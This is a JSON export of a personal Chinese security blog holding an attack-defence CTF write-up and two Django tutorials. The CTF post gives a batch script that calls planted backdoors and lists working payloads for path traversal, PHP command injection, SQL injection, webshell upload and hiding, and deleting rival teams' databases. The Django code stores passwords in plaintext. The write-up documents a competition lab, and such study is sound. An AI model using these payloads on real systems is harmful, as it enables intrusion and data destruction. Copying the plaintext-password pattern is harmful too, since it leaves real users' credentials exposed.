{"meta":{"title":"xjseck's Home","subtitle":"xjseck","description":"Xjseck blog","author":"xjseck","url":"https://www.xjseck.com"},"pages":[{"title":"about","date":"2017-09-06T08:23:38.000Z","updated":"2018-06-11T07:22:23.394Z","comments":false,"path":"about/index.html","permalink":"https://www.xjseck.com/about/index.html","excerpt":"","text":""},{"title":"category","date":"2017-09-06T08:18:04.000Z","updated":"2018-06-11T07:22:23.395Z","comments":false,"path":"category/index.html","permalink":"https://www.xjseck.com/category/index.html","excerpt":"","text":""},{"title":"link","date":"2017-09-06T08:06:57.000Z","updated":"2018-06-11T07:22:23.395Z","comments":false,"path":"link/index.html","permalink":"https://www.xjseck.com/link/index.html","excerpt":"","text":""},{"title":"search","date":"2018-06-11T07:22:23.395Z","updated":"2018-06-11T07:22:23.395Z","comments":false,"path":"search/index.html","permalink":"https://www.xjseck.com/search/index.html","excerpt":"","text":""},{"title":"tag","date":"2017-09-06T08:21:21.000Z","updated":"2018-06-11T07:22:23.396Z","comments":false,"path":"tag/index.html","permalink":"https://www.xjseck.com/tag/index.html","excerpt":"","text":""}],"posts":[{"title":"从头开始SRC漏洞挖掘","slug":"从头开始SRC漏洞挖掘","date":"2018-07-16T02:24:58.000Z","updated":"2018-09-05T15:19:46.496Z","comments":true,"path":"2018/07/16/从头开始SRC漏洞挖掘/","link":"","permalink":"https://www.xjseck.com/2018/07/16/从头开始SRC漏洞挖掘/","excerpt":"","text":"前言这段时间学习的东西比较积淀，想构造自己批量检测漏洞的工具，也是怕自己积攒的漏洞姿势不够，所以就疯狂的开始整理漏洞的利用方式。大致从Top10漏洞和常见的应用漏洞整理开始。大致整理 SRC案例学习，主要参考web-hacking-101、论坛Paper和一些Wooyun案例 分析一下各个挖洞大佬们提交的漏洞情况，一般有批量的嫌疑，但是最多的还是细节+手工 漏洞复现，积攒漏洞量和自己的敏感性 渗透测试经验补充和CTF刷题 立一个FLag 争取完善一下Top10的漏洞利用姿势 渗透测试Bypass姿势提升 批量脚本的编写和自动化的实现","categories":[{"name":"SRC","slug":"SRC","permalink":"https://www.xjseck.com/categories/SRC/"}],"tags":[{"name":"SRC","slug":"SRC","permalink":"https://www.xjseck.com/tags/SRC/"},{"name":"漏洞","slug":"漏洞","permalink":"https://www.xjseck.com/tags/漏洞/"}]},{"title":"6月9新警-易霖博杯网络安全技能大赛","slug":"6月9新警-易霖博杯网络安全技能大赛","date":"2018-06-11T07:30:32.000Z","updated":"2018-06-14T12:27:26.501Z","comments":true,"path":"2018/06/11/6月9新警-易霖博杯网络安全技能大赛/","link":"","permalink":"https://www.xjseck.com/2018/06/11/6月9新警-易霖博杯网络安全技能大赛/","excerpt":"","text":"描述 这次比赛从最初的想法提出应该是从5月初，警察学院的曹兄和我聊的时候，就想为上学期间交一份不枉此行的答卷，也为自己后续的学弟学妹们开阔一下学习交流的空间。本想是做一个内部交流的友谊赛，但是后面的决策，都是一些大佬说的算，最后也就是促成6月9号最终的比赛形式了，后面有机会还是想搞一个比较传统的CTF比赛，从线上到线下，自主命题线上和线下题目。CTF和Web渗透测试也算是玩的比较久的，现成的题目也积累了相对比较多，这一方面有感兴趣的小伙伴可以私下交流一下，具体的题目资源和本学校的信息安全协会都会有相应的介绍，关于CTF比赛WEB解题的模式，可以参考github上面的内容 github最后贴上几个图片吧。 题目wp 首先拿到题目，就比较懵逼，这比赛的感觉就不吐槽了，上来就是web版的ssh 才可以使用，只能一个人进行操作。 两个Web服务器，配搭着各种服务和漏洞。server1 root用户，web目录文件也是root，所以这个很蛇皮。Server2 admin用户，Web 目录文件也是admin组，这个还可以，文件权限都是777。 根据以往比赛经验来看，大致的思路我这里贴一下，后面再介绍此次比赛所用到的姿势。 1、备份。源码以及数据库，可以备份到隐蔽的目录（.xx）下，顺便down到本地（Win下：Winscp，FileZilla；Mac：scp，Transmit..）；2、扫描后门。有的比赛主办方留有后门，利用安全狗、D盾这类软件来扫描源码，快速定位并利用；或者利用seay的代码审计工具也可快速扫描到后门；3、弱口令。绝大多数情况下，所有队伍的Web后台、phpmyadmin等服务的管理密码都一样，快速修改自己密码（无关紧要的可直接mv来改名）并利用；4、自写敏感功能。主办方可能已经把CMS本身的漏洞补全了，并自写了一些敏感功能，如上传、包含界面..，这时候需要自己手动去发现（利用seay代码审计工具可快速定位、ls -t按修改时间来看最新被修改的文件），分析，删除，利用；5、监测文件上传时间可快速发现他人shell，并加以利用。我们上传的shell也可以修改文件时间来加强混淆，touch -r 目的 源；6、不要想办法提权，费时费力不讨好，给root的主办方都是假的；7、开一台ssh只做一件事，tail -f *.log，看日志，不言而喻，抓他们的payload并利用；8、CMS补漏洞没必要按着网上的一步一步修改源码来改，如果是一些无关紧要的功能，直接mv改名，大多数主办方只是check服务是否能正常运行；9、shell使用外部接受参数进行命令调用，多POST；10、权限维持很多方法，如果被种上都很恶心，不过如果挂上waf（禁止文件上传，执行任何命令均返回假flag，发现敏感字段直接exit [过滤都是假的]，…）这些都是浮云，手速还是最重要的；11、为了避免自己上传的shell都一样而被别人利用于其他服务器，可以采用md5等hash来命名文件名（避免，太扎眼）或者密码；12、如果被挂上内存马，并且没有权限来restart apache2下，完全可以直接在shell中（www-data 权限）下 kill -9 -1 杀死所有子进程（杀死当前用户所有进程，有权限下慎用），也可以直接killall apache2。这种操作并不会kill掉apache主进程，因为内存马是Apache启动的一个子进程；13、同12，要注意守护进程的文件，这个才是最恶心的；线下赛最重要的是文件、流量的监控和自身修补的防御，一人兼职边防边打往往会失去好多分 这次题目的分析 这里多说一句，涉及的工具和资源文件，可以参考我博客(xjseck.com)上的文章 和github上的资源文件 一、 上来备份文件，Web版的ssh，所以这里我直接给我的web都植入了一个一句话后门，使用#tar -cvf /tmp/web1.rar /var/www/html ，然后使用菜刀进行下载就好了二、 进行D盾或者我github上写好的scanshell.py 进行后门的扫描web1的扫描结果web2的扫描结果到这里的时候，队友就可以补上了，我们就很快速的写好了一个简单的批量脚本了，首轮就开始了进行手动提交flag了。 12345678910111213141516# coding:utf-8import requestsimport reflag = []ip = [1, 2, 3, 5, 6, 7, 8]# 105for i in ip: try: url = &quot;http://172.20.10&quot; + str(i) + &quot;.101&quot; + &quot;/index.php&quot; print url post = &#123;&apos;aa&apos;: &apos;system(\\&quot;cat /flaginfo.txt\\&quot;);&apos;&#125; a = requests.post(url, data=post, timeout=2) if a.status_code == 200: print a.text[:32] except: pass 其他的shell类推一下，只要针对能取得所有的队伍flag就ok了，因为flag刷新也就那么几轮，所以也就没有写自动化提交flag的脚本了。大多数时间，是在看神仙们打架。 三、 队友手动上的waf文件的时候少写了一个字母导致，丢失了20分，后面大家的访问日志就正常保存了。 四、 题目漏洞汇总 1234567891011121314151617181920工具扫描的shell是几个问题。分析源代码的漏洞大致有一下几点，都是手动构造的漏洞。1. web1/about.php?f=../../../../../../../../../../../flaginfo.txt2. web1/reg.php?a=system(&apos;cat /flaginfo.txt&apos;);3. web1/index.php?123=system(&apos;cat /flaginfo.txt&apos;);4. web1/message.php?id=1 union select 1,2,group_concat(user_name),4 from users--+ 注入后台用户名，mysql5.7 不能读文件好气。进入后台,user.php&lt;?php system(&quot;cat /root/flag.txt&quot;);?&gt;其实主办方的意思是，登录后台就能显示flag内容的，但是flag文件确实flaginfo.txt,就问你是蛇皮的吧。5. 最后阶段的时候丢了40分，突然就明白过来，不仅限于web服务，后面发现vsftp服务，直接允许匿名用户登录，映射的目录是根目录，直接可以刷一波 ftp://172.20.108.101/flaginfo.txt6. web1 mysql 可以进行远程登录 mysql -h -uroot -p123 进行任意队伍的web1数据库的ctf删除掉，迫使主办方进行重置，刷分。7. web1 后台的任意文件上传 POST /user/upload.php images/1528712524shell.php 访问web1/images/1528712524.php 8. web2/index.php?aa=system(&apos;cat /flaginfo.txt&apos;);9. web2/footer.php POST shell=cat /flaginfo.txt10. web2/config.php?c=system(&apos;cat /flaginfo.txt&apos;);11. web2/.a.php?c=system(&apos;cat /flaginfo.txt&apos;);12. web2/a.php?c=system(&apos;cat /flaginfo.txt&apos;);13. search.php?id=1 SQLMAP 跑后台密码，登录出flag 但是 又蛇皮14. 登录后有任意文件上传 web2 的详细wp可以参考主办方提供的wp，上传到了github上了。 防护 从上面的思路就可以知道，只要你发现了问题，才能比较好的进行修补，这次的比赛，也就是没有check文件，进行后台动态监控，选手的操作，主办方都不知道，哈哈哈，很蛇皮的吧。要是正常一点的话，就是web服务器一旦文件丢失或者web服务器不能访问，都会被扣分。网站的文件不多，都是能一眼可以看出问题的，手工都可以删改的吧。可能有队伍发现了，我们队伍使用的waf，哈哈，贴几个waf 防护的图片。 花絮 这次的比赛没有使用写好的专门的脚本，进行批量植入内存马，主要是给了root权限，和满地的shell，也就没有必要了。希望后面赛事的提高再使用吧。后面分析日志文件，发现有的队伍竟然使用web目录扫描工具，我就觉的很蛇皮，明明大家的都一样，为毛使用扫描工具呢，日志量还不是一般的大，发现是108,107,103的队伍进行扫描的，只能说大佬们的套路多:)师傅们不要打我！早知道写一个策略好了，哈哈。最后感谢大象安全公司，为我们此次的比赛保驾护航！","categories":[{"name":"CTF","slug":"CTF","permalink":"https://www.xjseck.com/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.xjseck.com/tags/CTF/"},{"name":"攻防竞赛","slug":"攻防竞赛","permalink":"https://www.xjseck.com/tags/攻防竞赛/"}]},{"title":"Django学习笔记(四)","slug":"Django学习笔记-四","date":"2018-02-09T16:40:27.000Z","updated":"2018-07-16T02:20:26.161Z","comments":true,"path":"2018/02/10/Django学习笔记-四/","link":"","permalink":"https://www.xjseck.com/2018/02/10/Django学习笔记-四/","excerpt":"","text":"前言上两篇我们学习了MVT和Models进行数据库的操作，这一篇我们还是以实例来讲解，主要学习使用Django 编写一个 注册、登录、验证码的例子。 我们将学到如下知识： Django forms表单样式排版 验证码实现的机制 cookies session 设置 Django request对象传值 Django 自带的用户登录判断 例子快速上手还是多动手敲打键盘编写代码，多动手实现。直接上学例子学习，主要是先建立Django实现功能的思想，里面的细枝末节可以搜索一下相关的资料进行补充巩固学习。这里介绍两种编写的方法，一种是自己设计用户登录注销管理cookies和session。另一种就是使用Django自带判断登录 注销等 例子四（1）验证码的部分参考https://strcpy.me/index.php/archives/176/每次获取的验证码都需要把上次生成的验证码消除。准备工作以后准备工作都是相同的，设置方面也是一直的。12345678910111213141516171819202122232425262728293031323334353637$python-admin startproject project #创建项目$python manage.py startapp blog #创建应用#设置数据库、应用加载、模板文件路径DATABASES = &#123; &apos;default&apos;: &#123; &apos;ENGINE&apos;: &apos;django.db.backends.mysql&apos;, &apos;NAME&apos;: &apos;django-test&apos;, &apos;USER&apos;: &apos;root&apos;, &apos;PASSWORD&apos;: &apos;seck@root...&apos;, &apos;HOST&apos;: &apos;127.0.0.1&apos;, &apos;PORT&apos;: &apos;3306&apos;, &#125;&#125;INSTALLED_APPS = ( &apos;django.contrib.admin&apos;, &apos;django.contrib.auth&apos;, &apos;django.contrib.contenttypes&apos;, &apos;django.contrib.sessions&apos;, &apos;django.contrib.messages&apos;, &apos;django.contrib.staticfiles&apos;, &apos;blog&apos;,)TEMPLATES = [ &#123; &apos;BACKEND&apos;: &apos;django.template.backends.django.DjangoTemplates&apos;, &apos;DIRS&apos;: [os.path.join(BASE_DIR, &apos;templates&apos;)], &apos;APP_DIRS&apos;: True, &apos;OPTIONS&apos;: &#123; &apos;context_processors&apos;: [ &apos;django.template.context_processors.debug&apos;, &apos;django.template.context_processors.request&apos;, &apos;django.contrib.auth.context_processors.auth&apos;, &apos;django.contrib.messages.context_processors.messages&apos;, ], &#125;, &#125;,] 项目的文件结构如图首先编写models.py 创建数据库表结构12345678910111213141516#!/usr/bin/env python#-*- coding:utf-8 _*-&quot;&quot;&quot;author:secktime: 2018/01/28&quot;&quot;&quot;from django import formsfrom .views import *class UserRegisterForm(forms.Form): username = forms.CharField(label=&apos;用户名&apos;,max_length=50) password = forms.CharField(label=&apos;密码&apos;,widget=forms.PasswordInput()) email = forms.EmailField(label=&apos;邮箱&apos;) # captcha1=captcha()class UserLoginForm(forms.Form): username = forms.CharField(label=&apos;用户名&apos;, max_length=50) password = forms.CharField(label=&apos;密码&apos;, widget=forms.PasswordInput()) 编写forms.py 创建类，继承form.Form 页面根据类的对象自动创建html标签 提交，request.POST 封装到类的对象里，obj=UserInfo(request.POST) 用户输入是否合法 obj.is_valid() 全部合法，获取全部内容 obj.clean() 只有有不合法 obj.errors1234567891011121314151617181920#!/usr/bin/env python#-*- coding:utf-8 _*-&quot;&quot;&quot;author:secktime: 2018/01/28&quot;&quot;&quot;from django import formsfrom .views import *class UserRegisterForm(forms.Form): username = forms.CharField( required=True, error_messages=&#123;&apos;required&apos;:&apos;用户名不能为空&apos;&#125;, label=&apos;用户名&apos;,max_length=50,widget=forms.TextInput(attrs=&#123;&apos;placeholder&apos;: &apos;Username&apos;,&apos;class&apos;:&apos;username11&apos;&#125;)) password = forms.CharField(label=&apos;密码&apos;,widget=forms.PasswordInput()) email = forms.EmailField(label=&apos;邮箱&apos;) # captcha1=captcha()class UserLoginForm(forms.Form): username = forms.CharField(required=True, error_messages=&#123;&apos;required&apos;:&apos;用户名不能为空&apos;&#125;,label=&apos;用户名&apos;, max_length=50) password = forms.CharField(label=&apos;密码&apos;, widget=forms.PasswordInput()) attrs属性是定义在html中用户登录框的css属性名称，error_messages 确认输入的是否规范返回错误的信息比如required=True 如果没有填入用户名，就会显示“用户名不能为空”细节参考http://www.cnblogs.com/zhaijunming5/category/892772.htmlhttp://www.cnblogs.com/yangmv/p/5327477.html 编写views.py进行控制数据传送关键点的信息就是使用session控制验证码的验证。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#coding:utf-8from django.shortcuts import renderfrom django.http import HttpResponse,HttpResponseRedirect ,requestfrom captcha import *from .forms import *from .models import *# Create your views here.#首先显示def index(request): data=[] try: if request.session[&apos;username&apos;]: seesion=request.session[&apos;username&apos;] print seesion if seesion: data.append(seesion) print &quot;login success!&quot; except Exception , e: print (e) data.append(&apos;no login&apos;) title=&quot;seck&quot; print request.COOKIES # return HttpResponse(&quot;&lt;img id=&apos;verifycode&apos; src=&apos;/captcha/&apos; alt=&apos;CheckCode&apos;/&gt;&quot;) return render(request,&apos;blog/index.html&apos;,&#123;&apos;title&apos;:title,&apos;data&apos;:data&#125;,)#验证码调用def captcha(request): Cap = Captcha(request) Code =Cap.display() return Code#注册def register(request): if request.method == &apos;POST&apos;: userform =UserRegisterForm(request.POST) cap = request.POST.get(&apos;cap&apos;) ca = Captcha(request) if userform.is_valid(): username = userform.cleaned_data[&apos;username&apos;] password = userform.cleaned_data[&apos;password&apos;] email = userform.cleaned_data[&apos;email&apos;] if ca.check(cap): print &quot;The code true&quot; else: print &quot;The code error!&quot; return HttpResponse(&quot;验证码不正确,请刷新后重新输入！&quot;) if User.objects.filter(username=username): print &quot;The user exits&quot; return HttpResponse(&quot;用户名重复！&quot;) else: User.objects.create(username=username, password=password, email=email).save() return HttpResponse(&apos;register success!&apos;) else: userform = UserRegisterForm() return render(request,&apos;blog/register.html&apos;,&#123;&apos;userform&apos;:userform,&#125;)def login(request): if request.method == &quot;POST&quot;: userform = UserLoginForm(request.POST) print userform.errors.get(&apos;username&apos;) if userform.is_valid(): username = userform.cleaned_data[&apos;username&apos;] password = userform.cleaned_data[&apos;password&apos;] user= User.objects.filter(username__exact=username,password__exact=password) if user: #Step1:生成随机字符串(seesionID) #Step2：通过cookie发送给客户端 #Step3：服务端保存 session print &quot;seck&quot; # print user.values()[0][username] request.session[&apos;username&apos;]=username print request.session # return render(request,&apos;blog/index.html&apos;,&#123;&apos;userform&apos;:userform&#125;) return HttpResponseRedirect(&apos;/&apos;) else: return HttpResponse(&apos;用户名或者密码错误！&apos;) else: print &quot;stsrat&quot; userform=UserLoginForm() return render(request,&apos;blog/login.html&apos;,&#123;&apos;userform&apos;:userform&#125;)def sign_out(request): del request.session[&apos;username&apos;] return HttpResponseRedirect(&apos;/&apos;) urls.py 的设置blog/urls.py1234567891011121314151617#!/usr/bin/env python#-*- coding:utf-8 _*-&quot;&quot;&quot;author:secktime: 2018/01/28&quot;&quot;&quot;from django.conf.urls import include, urlfrom views import *urlpatterns = [ # Examples: # url(r&apos;^$&apos;, &apos;blog_week_6.views.home&apos;, name=&apos;home&apos;), url(r&apos;^captcha/$&apos;,captcha), url(r&apos;^login/$&apos;,login), url(r&apos;^register/$&apos;,register), url(r&apos;^sign_out/$&apos;,sign_out), url(r&apos;&apos;, index,name=&apos;index&apos;),] 根目录下的urls.py123456789from django.conf.urls import include, urlfrom django.contrib import adminurlpatterns = [ # Examples: # url(r&apos;^$&apos;, &apos;blog_week_8.views.home&apos;, name=&apos;home&apos;), # url(r&apos;^blog/&apos;, include(&apos;blog.urls&apos;)), url(r&apos;&apos;,include(&apos;blog.urls&apos;)), url(r&apos;^admin/&apos;, include(admin.site.urls)),] 模板文件的代码index.html12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;&#123;&#123;title&#125;&#125;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;welcome &#123;% if data %&#125;&#123;% for data in data%&#125; &#123;% if &apos;no&apos; not in data %&#125; &#123;&#123;data&#125;&#125; &lt;a href=&quot;/sign_out/&quot;&gt;退出&lt;/a&gt; &#123;% endif%&#125; &#123;% endfor %&#125; &#123;% endif %&#125;&lt;/h1&gt;&lt;a href=&quot;/login/&quot;&gt;登录 &lt;/a&gt;&lt;br&gt;&lt;a href=&quot;/register/&quot;&gt;注册 &lt;/a&gt;&lt;/body&gt;&lt;/html&gt; login.html1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;登录页面&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &#123;% csrf_token %&#125; &#123;&#123;userform&#125;&#125; &lt;input type=&quot;submit&quot; name=&quot;sumit&quot; value=&quot;login&quot;&gt;&lt;/form&gt;&lt;a href=&quot;/&quot;&gt;首页 &lt;/a&gt;&lt;br&gt;&lt;a href=&quot;/register/&quot;&gt;注册 &lt;/a&gt;&lt;/body&gt;&lt;/html&gt; register.html123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;注册页面&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &#123;% csrf_token %&#125; &#123;&#123;userform&#125;&#125; 验证码 &lt;input type=&quot;text&quot; name=&quot;cap&quot;&gt; &lt;img src=&quot;&#123;&#123;&apos;/captcha/&apos;&#125;&#125;&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;sumit&quot; value=&quot;register&quot;&gt;&lt;/form&gt;&lt;a href=&quot;/login/&quot;&gt;登录 &lt;/a&gt;&lt;br&gt;&lt;a href=&quot;/&quot;&gt;首页 &lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 项目代码https://github.com/Huseck/Django-study/tree/Django-study-4本篇的运行结果图 例子四（2） 主要关注的几个逻辑问题 怎么判断用户名是否重名 继承自带的auth.user表是否能添加我们还需要的字段 使用DjangoCaptcha判断机制是否符合要求 forms继承的关系和判断form表单数据 准备 这里我们使用自带的auth_user实现注册、登录验证。 安装pip install django-simple-captcha==0.5.6 配置 settings.py 12345678910INSTALLED_APPS = ( &apos;django.contrib.admin&apos;, &apos;django.contrib.auth&apos;, &apos;django.contrib.contenttypes&apos;, &apos;django.contrib.sessions&apos;, &apos;django.contrib.messages&apos;, &apos;django.contrib.staticfiles&apos;, &apos;blog&apos;, &apos;captcha&apos;,) 根目录下的urls.py也要配置验证码的路由 12345urlpatterns = [ url(r&apos;&apos;, include(&apos;blog.urls&apos;)), url(r&apos;^admin/&apos;, include(admin.site.urls)), url(r&apos;^captcha/&apos;, include(&apos;captcha.urls&apos;)),] 之后我们生成默认的数据库，成功之后会发现是有captcha_captchastore表的然后开始编写我们的forms表单，blog目录下创建forms.py文件代码如下: 1234567891011121314151617181920#!/usr/bin/env python#-*- coding:utf-8 _*-&quot;&quot;&quot;author:secktime: 2018/02/09&quot;&quot;&quot;from django import formsfrom captcha.fields import CaptchaFieldfrom django.contrib.auth.forms import UserCreationForm, AuthenticationFormfrom .models import Usersclass CreateUser(UserCreationForm): #UserCreationForm 里面自带的会验证重名 username = forms.CharField(error_messages=&#123;&apos;required&apos;:u&quot;用户名不能为空&quot;&#125;) password = forms.CharField(widget=forms.PasswordInput(),error_messages=&#123;&apos;required&apos;:u&quot;密码不能为空&quot;&#125;) email = forms.CharField() captcha = CaptchaField()class Auth(AuthenticationForm): username = forms.CharField(error_messages=&#123;&apos;required&apos;: &apos;用户名不能为空&apos;&#125;) password = forms.CharField(widget=forms.PasswordInput(),error_messages=&#123;&apos;required&apos;:u&quot;密码不能为空&quot;&#125;) captcha = CaptchaField() 我们编写一下视图函数 1234567891011121314151617181920212223242526272829303132333435363738394041#coding:utf-8from django.shortcuts import render,redirectfrom django.http import HttpResponsefrom django.contrib.auth import authenticate, login, logoutfrom django.contrib.auth import modelsfrom django.contrib.auth.models import Userfrom .forms import CreateUser,Authdef index(request): return render(request,&apos;blog/index.html&apos;)def register(request): createform = CreateUser(data=request.POST or None) if request.method == &quot;POST&quot;: if createform.is_valid(): username = createform.clean_username() password = createform.clean_password2() email = createform.clean()[&apos;email&apos;] #django 默认的user表创建用户使用create_user函数 user = User.objects.create_user(username=username,password=password,email=email) user.save() return HttpResponse(u&quot;注册成功&quot;) else: error_msg = createform.errors print error_msg return render(request,&apos;blog/register.html&apos;,&#123;&quot;errors&quot;:error_msg&#125;) return render(request,&apos;blog/register.html&apos;,&#123;&quot;createform&quot;:createform&#125;)def auth(request): authform = Auth(data=request.POST or None) if request.method == &quot;POST&quot;: #判断输入的数据是否符合规则 if authform.is_valid(): login(request,authform.get_user()) return render(request,&apos;blog/index.html&apos;,&#123;&#125;) else: #如果数据不符合规则，就显示错误信息 error_msg=authform.errors print authform.errors return render(request, &apos;blog/login.html&apos;, &#123;&quot;userform&quot;: authform, &quot;errors&quot;: error_msg&#125;) return render(request,&apos;blog/login.html&apos;,&#123;&quot;userform&quot;:authform&#125;)def sign_out(request): logout(request) return redirect(&quot;/&quot;) 问题一验证重名我们的CreateForm继承UserCreateForm 这个类继承User 这个又继承AbstractUser然后找到关键位置12345在文件site-packages\\django\\contrib\\auth\\models.py 394行左右找到error_messages=&#123; &apos;unique&apos;: _(&quot;A user with that username already exists.&quot;), &#125;) 也就是is_valid 方法判断error是否有错误存在判断出重名 username 是unique=True 值唯一的定义 问题二验证码当我们登录或者注册一个用户的时候，浏览器点击返回，在用此验证码注册其他的账号时，验证码应该是失效的，django-simple-captcha满足。问题三form表单的继承我们继承了UserCreationForm 和AuthenticationForm进行数据的验证，使用自带的验证方法实现用户的注册和登录。 结束语当django自带的数据表和验证方法不满足需求时，需要自行扩展接口功能，实现应用。","categories":[{"name":"Django","slug":"Django","permalink":"https://www.xjseck.com/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"https://www.xjseck.com/tags/Django/"}]},{"title":"Django学习笔记(三)","slug":"Django学习笔记-三","date":"2018-01-31T16:31:33.000Z","updated":"2018-07-15T16:41:03.099Z","comments":true,"path":"2018/02/01/Django学习笔记-三/","link":"","permalink":"https://www.xjseck.com/2018/02/01/Django学习笔记-三/","excerpt":"","text":"前言 通过上一个笔记的学习，我们大致明白了Django怎么从Views 传到url中然后在templates中进行显示内容。这一篇我们讲学习models控制数据库数据进行操作。相关内容如下： Django Models中相关的字段 Django ORM模式的理解 Django Models操作例子上一篇的源代码中blog目录下的Models.py中建立了相关的数据类。只需要执行如下命令就能在相应的数据库中建立表。源代码https://github.com/Huseck/Django-study/tree/Django-study-3需要配置mysql的连接信息，以及创建数据库。12345678910111213141516$python manage.py makemigrations$python manage.py migrate#之后我们进行数据操作$python manage.py shell #进入shell命令下进行操作&gt;&gt;&gt;from blog.models import New #导入所需的模块&gt;&gt;&gt;from datetime import * #进行数据的增、删、改、查&gt;&gt;&gt;New.objects.create(title=&quot;test1&quot;,body=&apos;test1&apos;,created_time=datetime.now(),modified_time=datetime.now(),author_id=1,category_id=1)&gt;&gt;&gt;New.objects.get(title=&apos;test1&apos;).delete()&gt;&gt;&gt;N=New.objects.get(title=&apos;seck&apos;)&gt;&gt;&gt;N.body=(&apos;seck-test&apos;)&gt;&gt;&gt;N.save()#进行查操作显示数据的时候，注意要在Models.py中进行添加 def __unicode__(self): return self.title#其他filter 切片等操作自行百度学习 例子三本例子中我们学习models模型操作数据库。首先还是新建项目 settings.py中配置Mysql12345678910DATABASES = &#123;&apos;default&apos;: &#123; &apos;ENGINE&apos;: &apos;django.db.backends.mysql&apos;, &apos;NAME&apos;: &apos;django-model&apos;, &apos;USER&apos;: &apos;root&apos;, &apos;PASSWORD&apos;: &apos;pass&apos;, &apos;HOST&apos;: &apos;127.0.0.1&apos;, &apos;PORT&apos;: &apos;3306&apos;,&#125;&#125; 然后创建app models.py代码如下123456789101112131415161718192021222324252627#coding:utf-8from django.db import models# Create your models here.from django.db import modelsfrom django.utils.encoding import python_2_unicode_compatible@python_2_unicode_compatibleclass Author(models.Model): name = models.CharField(max_length=50) qq = models.CharField(max_length=10) addr = models.TextField() email = models.EmailField() def __str__(self): return self.name@python_2_unicode_compatibleclass Article(models.Model): title = models.CharField(max_length=50) author = models.ForeignKey(Author) content = models.TextField() score = models.IntegerField() # 文章的打分 tags = models.ManyToManyField(&apos;Tag&apos;) def __str__(self): return self.title@python_2_unicode_compatibleclass Tag(models.Model): name = models.CharField(max_length=50) def __str__(self): return self.name 导入数据 initdb.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546#!/usr/bin/env python#-*- coding:utf-8 _*-&quot;&quot;&quot;author:secktime: 2018/01/26&quot;&quot;&quot;import randomfrom blog_week_5.wsgi import *from Model_study.models import Author, Article, Tagauthor_name_list = [&apos;xjnu&apos;, &apos;seck&apos;, &apos;sfdx&apos;, &apos;test&apos;, &apos;xjseck&apos;]article_title_list = [&apos;Django 笔记&apos;, &apos;Python 学习&apos;, &apos;HTML 学习&apos;]def create_authors(): for author_name in author_name_list: author, created = Author.objects.get_or_create(name=author_name) # 随机生成9位数的QQ， author.qq = &apos;&apos;.join( str(random.choice(range(10))) for _ in range(9) ) author.addr = &apos;addr_%s&apos; % (random.randrange(1, 3)) author.email = &apos;%s@seck.com&apos; % (author.addr) author.save()def create_articles_and_tags(): # 随机生成文章 for article_title in article_title_list: # 从文章标题中得到 tag tag_name = article_title.split(&apos; &apos;, 1)[0] tag, created = Tag.objects.get_or_create(name=tag_name) random_author = random.choice(Author.objects.all()) for i in range(1, 21): title = &apos;%s_%s&apos; % (article_title, i) article, created = Article.objects.get_or_create( title=title, defaults=&#123; &apos;author&apos;: random_author, # 随机分配作者 &apos;content&apos;: &apos;%s 正文&apos; % title, &apos;score&apos;: random.randrange(70, 101), # 随机给文章一个打分 &#125; ) article.tags.add(tag)def main(): create_authors() create_articles_and_tags()if __name__ == &apos;__main__&apos;: main() print(&quot;Done!&quot;)Django queryset 进行的操作 查看所执行的SQL语句 12345678$python manage.py shell&gt;&gt;&gt;from Model_study.models import Article,Author,Tag&gt;&gt;&gt; print str(Author.objects.all().query) #打印所执行的sql语句&gt;&gt;&gt; Author.objects.all().query.__str__() #这样也可以（只对select有用）&gt;&gt;&gt; Author=Author.objects.values_list(&apos;name&apos;,&apos;qq&apos;)&gt;&gt;&gt; Author #以元祖形式输出结果&gt;&gt;&gt; Author.objects.values_list(&apos;name&apos;,flat=True) #指定一个字段&gt;&gt;&gt; Article.objects.filter(author__name=&apos;xjnu&apos;).values_list(&apos;title&apos;,flat=True) #多表查询 查询结果排序 12&gt;&gt;&gt;Author.objects.all().order_by(&apos;name&apos;) &gt;&gt;&gt; Author.objects.all().order_by(&apos;-name&apos;); #倒序排列 支持正则 Where 查询 123&gt;&gt;&gt;Author.objects.filter(name__regex=&apos;^s.+&apos;).exclude(qq=399753917)#字段名+ 两个下划线 参考https://www.cnblogs.com/BigJ/p/7530516.html #exclude 类似SQL语句的where 索引查询 123&gt;&gt;&gt; Author.objects.all()[:1] #不支持负数&gt;&gt;&gt; Author.objects.all().reverse()[0]&gt;&gt;&gt; Author.objects.order_by(&apos;-id&apos;)[0] 和SQL语句进行显示调试，此方法能显示所有执行的sql语句 123456789101112131415161718192021222324 首先在settings.py最后加上 LOGGING = &#123; &apos;version&apos;: 1, &apos;disable_existing_loggers&apos;: False, &apos;handlers&apos;: &#123; &apos;console&apos;: &#123; &apos;class&apos;: &apos;logging.StreamHandler&apos;, &#125;, &#125;, &apos;loggers&apos;: &#123; &apos;django.db.backends&apos;: &#123; &apos;handlers&apos;: [&apos;console&apos;], &apos;level&apos;: &apos;DEBUG&apos; if DEBUG else &apos;INFO&apos;, &#125;, &#125;,&#125; 然后在$python manage.py shell 下进行操作会显示sql语句 &gt;&gt;&gt; from Model_study.models import Article,Author ,Tag &gt;&gt;&gt; a=Article.objects.get(pk=1) (0.000) SET SQL_AUTO_IS_NULL = 0; args=None (0.000) SET SQL_AUTO_IS_NULL = 0; args=None (0.000) SELECT `Model_study_article`.`id`, `Model_study_article`.`title`, `Model_study_article`.`author_id`, `Model_study_article`.`content`, `Model_study_article`.`score` FROM `Model_study_article` WHERE 